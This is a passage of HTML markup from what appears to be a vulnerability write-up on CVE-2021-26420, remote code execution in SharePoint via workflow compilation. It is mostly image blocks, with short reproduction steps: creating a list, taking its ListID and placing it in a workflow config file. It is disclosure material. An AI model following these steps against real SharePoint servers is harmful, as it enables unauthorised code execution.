    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_149">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_148">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_147">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_146">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:55.769229888916016%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_145">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png" data-image-dimensions="936x522" data-image-focal-point="0.5,0.5" alt="Picture5.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture5.png" width="936" height="522" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462926706-2NL10DXILWF3LF75MK5G/Picture5.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_118145"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Click “<strong><em>Finish</em></strong>” and the new site will be created:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_118620"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_166">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_165">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_164">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_163">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_162">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:59.829063415527344%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_161">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png" data-image-dimensions="936x560" data-image-focal-point="0.5,0.5" alt="Picture6.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture6.png" width="936" height="560" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633462986227-RSGAZOEWQRX3RO5J8N56/Picture6.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_120002"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Now we need to create a new list. Click on the “<strong><em>Site contents</em></strong>” link:&nbsp; </p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_120476"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_182">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_181">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_180">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_179">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_178">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:44.4444465637207%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_177">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png" data-image-dimensions="936x416" data-image-focal-point="0.5,0.5" alt="Picture7.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture7.png" width="936" height="416" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463025356-3AARD9XCJHWD2EFX4ISG/Picture7.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_121863"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Then click <strong>“+ New</strong>” -&gt; “<strong>List</strong>”:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_122337"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_198">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_197">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_196">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_195">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_194">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:42.094017028808594%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_193">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png" data-image-dimensions="936x394" data-image-focal-point="0.5,0.5" alt="Picture8.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture8.png" width="936" height="394" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463080582-DTIRY5UJ3T2X7K9VIXDF/Picture8.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_123772"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">Enter any available name. For example, “<strong>NewList</strong>”:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_124249"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_214">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_213">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_212">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_211">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_210">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:43.376068115234375%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_209">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png" data-image-dimensions="936x406" data-image-focal-point="0.5,0.5" alt="Picture9.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture9.png" width="936" height="406" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463115480-3K7WEWSZPSTBSR5SL5MC/Picture9.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_125628"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">And click “<strong><em>Create</em></strong>”:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_126104"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_230">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_229">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_228">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_227">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_226">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:36.32478713989258%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_225">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png" data-image-dimensions="936x340" data-image-focal-point="0.5,0.5" alt="Picture10.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture10.png" width="936" height="340" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463151084-L7PVWAI1NRUHZC7PM1LM/Picture10.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_127484"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We will need the <strong>ListID</strong> of this new list. Let’s go back to the “<strong><em>Site contents</em></strong>” page and click on “<strong>Settings</strong>” in the dropdown menu for our new list:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_127962"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_246">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_245">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_244">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_243">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_242">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:46.58119583129883%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_241">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png" data-image-dimensions="936x436" data-image-focal-point="0.5,0.5" alt="Picture11.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture11.png" width="936" height="436" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463188588-F2I980TKBBLYF9ECENQ1/Picture11.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_129344"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We will be redirected to the <strong>listedit.aspx</strong> page:</p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_129823"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_262">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_261">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_260">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_259">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_258">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:43.376068115234375%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_257">
                
                
                
                
                
                
                
                <img data-stretch="false" data-src="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png" data-image="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png" data-image-dimensions="936x406" data-image-focal-point="0.5,0.5" alt="Picture12.png" data-load="false" elementtiming="system-image-block" src="./Zero Day Initiative — CVE-2021-26420_ Remote Code Execution in SharePoint via Workflow Compilation_files/Picture12.png" width="936" height="406" sizes="(max-width: 640px) 100vw, (max-width: 767px) 100vw, 100vw" style="display:block;object-fit: cover; width: 100%; height: 100%; object-position: 50% 50%" onload="this.classList.add(&quot;loaded&quot;)" srcset="https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=100w 100w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=300w 300w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=500w 500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=750w 750w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=1000w 1000w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=1500w 1500w, https://images.squarespace-cdn.com/content/v1/5894c269e4fcb5e65a1ed623/1633463238564-AG0LM36AG47H8LODQH64/Picture12.png?format=2500w 2500w" loading="lazy" decoding="async" data-loader="sqs" class="loaded">

            </div>
          </div>
        
            </button>
          
        

        
      
        </figure>
      

    </div>
  


  


</div></div><div class="sqs-block html-block sqs-block-html" data-block-type="2" data-sqsp-block="text" id="block-yui_3_17_2_1_1632752463728_131212"><div class="sqs-block-content">

<div class="sqs-html-content" data-sqsp-text-block-content="">
  <p class="" style="white-space:pre-wrap;">We need value of the <strong><em>List</em></strong> URL parameter. In my case it is:</p><p style="margin-left:40px;white-space:pre-wrap;" class=""><strong>28e11fd2-9f76-418c-83ea-dc0d8f3c184b&nbsp; </strong></p><p class="" style="white-space:pre-wrap;">We need to place this value into the <strong><em>ListId</em></strong> attribute in the workflow config file, <strong>WF02config.txt</strong>:&nbsp; </p>
</div>






















</div></div><div class="sqs-block image-block sqs-block-image sqs-text-ready" data-block-type="5" id="block-yui_3_17_2_1_1632752463728_131719"><div class="sqs-block-content" id="yui_3_17_2_1_1762949703938_278">










































  

    
  
    <div class="
          image-block-outer-wrapper
          layout-caption-hidden
          design-layout-inline
          combination-animation-none
          individual-animation-none
          individual-text-animation-none
        " data-test="image-block-inline-outer-wrapper" id="yui_3_17_2_1_1762949703938_277">

      

      
        <figure class="
              sqs-block-image-figure
              intrinsic
            " style="max-width:936px;" id="yui_3_17_2_1_1762949703938_276">
          
        
        

        
          
            <button class="
                  sqs-block-image-button
                  lightbox
                  
          
        
                " data-description="" data-lightbox-theme="dark" id="yui_3_17_2_1_1762949703938_275">
              <span class="v6-visually-hidden">View fullsize</span>
              
          <div class="image-block-wrapper" data-animation-role="image" id="yui_3_17_2_1_1762949703938_274">
            <div class="sqs-image-shape-container-element
              
          
        
              has-aspect-ratio
            " style="
                position: relative;
                
                  padding-bottom:32.905982971191406%;
                
                overflow: hidden;-webkit-mask-image: -webkit-radial-gradient(white, black);
              " id="yui_3_17_2_1_1762949703938_273">
                
                
                
                
                
                
                
